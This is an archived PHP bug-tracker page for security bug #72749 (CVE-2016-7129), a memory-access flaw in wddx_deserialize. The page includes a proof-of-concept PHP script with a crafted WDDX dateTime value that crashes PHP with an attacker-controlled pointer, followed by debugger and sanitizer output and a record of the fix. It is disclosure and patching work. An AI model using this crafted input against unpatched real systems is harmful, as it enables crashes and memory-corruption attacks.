<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='WDDX related Bug #72749 - RDF' href='rss/bug.php?id=72749'>
        <link rel='alternate' type='application/rss+xml' title='WDDX related Bug #72749 - RSS 2.0' href='rss/bug.php?id=72749&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #72749 :: wddx_deserialize allows illegal memory access</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=72749">Sec Bug</a>&nbsp;#72749</th>
            <td id="summary" colspan="5">wddx_deserialize allows illegal memory access</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-08-03 18:36 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-09-05 15:28 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=WDDX+related">WDDX related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.24</td>
            <th class="details">OS:</th>
            <td>*</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7129" target="_blank">2016-7129</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=72749&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=72749&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=72749&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1470249362">&nbsp;</a><strong>[2016-08-03 18:36 UTC] fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
While deserializing an invalid dateTime value, wddx_deserialize will parse it in a wrong way and then assign the supplied value as the address of the created variable. This allows illegal memory access. We noted that the problem seems to happen because of the included \r inside the value of the dateTime.

GDB output
----------
$ gdb -q --args /ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php -n wdx17.php
No symbol table is loaded.  Use the &quot;file&quot; command.
Breakpoint 1 (__asan_report_error) pending.
Reading symbols from /ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php...done.
gdb-peda$ r
Starting program: /ramdisk/php-fuzz/phuzzer/php-70/sapi/cli/php -n wdx17.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
array(1) {
  [&quot;aDateTime3&quot;]=&gt;

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffef65ea20 --&gt; 0x41414131 ('1AAA')
RCX: 0x1501b90 (&lt;php_var_dump+1312&gt;:    mov    r13,rbx)
RDX: 0x8282828
RSI: 0x41414131 ('1AAA')
RDI: 0x41414141 ('AAAA')
RBP: 0x7fffffffa280 --&gt; 0x7fffffffa400 --&gt; 0x7fffffffa4e0 --&gt; 0x7fffffffa530 --&gt; 0x7fffffffa550 --&gt; 0x7fffffffa5c0 (--&gt; ...)
RSP: 0x7fffffffa110 --&gt; 0x16ae960 (&lt;php_printf&gt;:        lea    rsp,[rsp-0x98])
RIP: 0x1501bf8 (&lt;php_var_dump+1416&gt;:    mov    rdx,QWORD PTR [rsi+0x10])
R8 : 0xffffdecbd45 --&gt; 0x0
R9 : 0x2451400 --&gt; 0xff0b0578ff0b0ad8
R10: 0x1
R11: 0x0
R12: 0x0
R13: 0xffffdecbd44 --&gt; 0x0
R14: 0x7fffffffa170 --&gt; 0x41b58ab3
R15: 0xffffffff42e --&gt; 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x1501be7 &lt;php_var_dump+1399&gt;:       mov    rcx,QWORD PTR [rsp+0x8]
   0x1501bec &lt;php_var_dump+1404&gt;:       mov    rdx,QWORD PTR [rsp]
   0x1501bf0 &lt;php_var_dump+1408&gt;:       lea    rsp,[rsp+0x98]
=&gt; 0x1501bf8 &lt;php_var_dump+1416&gt;:       mov    rdx,QWORD PTR [rsi+0x10]
   0x1501bfc &lt;php_var_dump+1420&gt;:       lea    r11,[rip+0xf4f1fd]        # 0x2450e00
   0x1501c03 &lt;php_var_dump+1427&gt;:       lea    rsi,[rip+0xf4f1b6]        # 0x2450dc0
   0x1501c0a &lt;php_var_dump+1434&gt;:       test   r12d,r12d
   0x1501c0d &lt;php_var_dump+1437&gt;:       lea    rdi,[rip+0xf4f3ec]        # 0x2451000
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffa110 --&gt; 0x16ae960 (&lt;php_printf&gt;:       lea    rsp,[rsp-0x98])
0008| 0x7fffffffa118 --&gt; 0x28286b8 --&gt; 0x7ffff5689910 (&lt;xmlFreeParserCtxt&gt;:     test   rdi,rdi)
0016| 0x7fffffffa120 --&gt; 0x7fffef676000 --&gt; 0x7fffef676070 --&gt; 0x7fffef6760e0 --&gt; 0x7fffef676150 --&gt; 0x7fffef6761c0 (--&gt; ...)
0024| 0x7fffffffa128 --&gt; 0x7fffef66c158 --&gt; 0x61700000f900 --&gt; 0x611027800013 --&gt; 0x0
0032| 0x7fffffffa130 --&gt; 0x7fffef66c140 --&gt; 0x7fffef66c1e0 --&gt; 0x7fffef66c280 --&gt; 0x7fffef66c320 --&gt; 0x7fffef66c3c0 (--&gt; ...)
0040| 0x7fffffffa138 --&gt; 0x7fffef6140c0 --&gt; 0x7fffef658420 --&gt; 0xc002000700000002
0048| 0x7fffffffa140 --&gt; 0x7fffffffa340 --&gt; 0x0
0056| 0x7fffffffa148 --&gt; 0x7ffff7de68f6 (&lt;_dl_fixup+214&gt;:       mov    r8,rax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000001501bf8 in php_var_dump (struc=struc@entry=0x7fffef65ea20, level=level@entry=0x3) at /home/operac/php-70/ext/standard/var.c:111
111                             php_printf(&quot;%sstring(%zd) \&quot;&quot;, COMMON, Z_STRLEN_P(struc));
gdb-peda$ p *struc
$1 = {
  value = {
    lval = 0x41414131,
    dval = 5.4090087986211999e-315,
    counted = 0x41414131,
    str = 0x41414131,
    arr = 0x41414131,
    obj = 0x41414131,
    res = 0x41414131,
    ref = 0x41414131,
    ast = 0x41414131,
    zv = 0x41414131,
    ptr = 0x41414131,
    ce = 0x41414131,
    func = 0x41414131,
    ww = {
      w1 = 0x41414131,
      w2 = 0x0
    }
  },
  u1 = {
    v = {
      type = 0x6,
      type_flags = 0x14,
      const_flags = 0x0,
      reserved = 0x0
    },
    type_info = 0x1406
  },
  u2 = {
    var_flags = 0xffffffff,
    next = 0xffffffff,
    cache_slot = 0xffffffff,
    lineno = 0xffffffff,
    num_args = 0xffffffff,
    fe_pos = 0xffffffff,
    fe_iter_idx = 0xffffffff
  }
}


Test script:
---------------
&lt;?php

// timestamp(2004-09-10T05:52:49+00) = 0x41414131

$xml = &lt;&lt;&lt;XML
&lt;?xml version='1.0'?&gt;
&lt;!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'&gt;
&lt;wddxPacket version='1.0'&gt;
&lt;header/&gt;
        &lt;data&gt;
                &lt;struct&gt;
                     &lt;var name='aDateTime3'&gt;
                         &lt;dateTime&gt;2\r2004-09-10T05:52:49+00&lt;/dateTime&gt;
                     &lt;/var&gt;
                 &lt;/struct&gt;
        &lt;/data&gt;
&lt;/wddxPacket&gt;
XML;

$array = wddx_deserialize($xml);
var_dump($array);

Expected result:
----------------
Not crash

Actual result:
--------------
/ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php -n wdx16.php
array(1) {
  [&quot;aDateTime3&quot;]=&gt;
  ASAN:SIGSEGV
=================================================================
==21112==ERROR: AddressSanitizer: SEGV on unknown address 0x000041414141 (pc 0x000001501bf8 bp 0x7fff933d2710 sp 0x7fff933d25a0 T0)
    #0 0x1501bf7 in php_var_dump /home/operac/php-70/ext/standard/var.c:111
    #1 0x150229b in php_array_element_dump /home/operac/php-70/ext/standard/var.c:47
    #2 0x150229b in php_var_dump /home/operac/php-70/ext/standard/var.c:127
    #3 0x15037c8 in zif_var_dump /home/operac/php-70/ext/standard/var.c:205
    #4 0x1da38da in ZEND_DO_ICALL_SPEC_HANDLER /home/operac/php-70/Zend/zend_vm_execute.h:586
    #5 0x1b4c335 in execute_ex /home/operac/php-70/Zend/zend_vm_execute.h:414
    #6 0x1df9dc8 in zend_execute /home/operac/php-70/Zend/zend_vm_execute.h:458
    #7 0x194764a in zend_execute_scripts /home/operac/php-70/Zend/zend.c:1427
    #8 0x16b8347 in php_execute_script /home/operac/php-70/main/main.c:2494
    #9 0x1e02126 in do_cli /home/operac/php-70/sapi/cli/php_cli.c:974
    #10 0x467378 in main /home/operac/php-70/sapi/cli/php_cli.c:1344
    #11 0x7fa02afca82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #12 0x467a48 in _start (/ramdisk/php-fuzz/phuzzer/php-70/sapi/cli/php+0x467a48)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/operac/php-70/ext/standard/var.c:111 php_var_dump
==21112==ABORTING


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=72749'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=72749'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1470295158">&nbsp;</a><strong>[2016-08-04 07:19 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.0.9</span>
<span class="added">+PHP Version: 5.6.24</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1470295158">&nbsp;</a><strong>[2016-08-04 07:19 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>fix in <a href="https://gist.github.com/be0c8e48ffaf421d003f1335fcbe6fe4" rel="nofollow">https://gist.github.com/be0c8e48ffaf421d003f1335fcbe6fe4</a>
 and in security repo as 659a21dc20f0b64dafd8cb16573059d3b45cce6b. Please verify.
</pre>
</div><div class='comment type_comment' ><a name="1470548221">&nbsp;</a><strong>[2016-08-07 05:37 UTC] fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</strong>
<pre class='note'>operac@hp2:~/crashes/wdx15$ /home/operac/build2/bin/php -n 15.php 
array(1) {
 [&quot;aDateTime3&quot;]=&gt;
 string(24) &quot;2
2004-09-10T05:52:49+00&quot;
}

Patch works OK. thanks.
</pre>
</div><div class='comment type_related' ><a name="1470895907">&nbsp;</a><strong>[2016-08-11 06:11 UTC] fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</strong>
<pre class='note'>Related To: <a href='bug.php?id=72790'>Bug #72790</a>
</pre>
</div><div class='comment type_log' ><a name="1471240899">&nbsp;</a><strong>[2016-08-15 06:01 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: needed</span>
</div></div></div><div class='comment type_svn' ><a name="1471413446">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div><div class='comment type_log' ><a name="1471413446">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1471422220">&nbsp;</a><strong>[2016-08-17 08:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div><div class='comment type_svn' ><a name="1471422224">&nbsp;</a><strong>[2016-08-17 08:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e3829b88694460a2e5af10ad5eee9966fa55e589" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e3829b88694460a2e5af10ad5eee9966fa55e589</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div><div class='comment type_svn' ><a name="1471425338">&nbsp;</a><strong>[2016-08-17 09:15 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div><div class='comment type_svn' ><a name="1471425341">&nbsp;</a><strong>[2016-08-17 09:15 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e3829b88694460a2e5af10ad5eee9966fa55e589" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e3829b88694460a2e5af10ad5eee9966fa55e589</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div><div class='comment type_svn' ><a name="1471435444">&nbsp;</a><strong>[2016-08-17 12:04 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=d9fac3953d5b8a6b14c612b4ae351b8ae6dda481" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=d9fac3953d5b8a6b14c612b4ae351b8ae6dda481</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div><div class='comment type_svn' ><a name="1471518914">&nbsp;</a><strong>[2016-08-18 11:15 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=db38282f421a5d552840aeac807efc2f584162d2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=db38282f421a5d552840aeac807efc2f584162d2</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div><div class='comment type_log' ><a name="1473089329">&nbsp;</a><strong>[2016-09-05 15:28 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2016-7129</span>
</div></div></div><div class='comment type_svn' ><a name="1476698976">&nbsp;</a><strong>[2016-10-17 10:09 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div><div class='comment type_svn' ><a name="1476698980">&nbsp;</a><strong>[2016-10-17 10:09 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e3829b88694460a2e5af10ad5eee9966fa55e589" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e3829b88694460a2e5af10ad5eee9966fa55e589</a>
Log: Fix <a href='bug.php?id=72749'>bug #72749</a>: wddx_deserialize allows illegal memory access
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
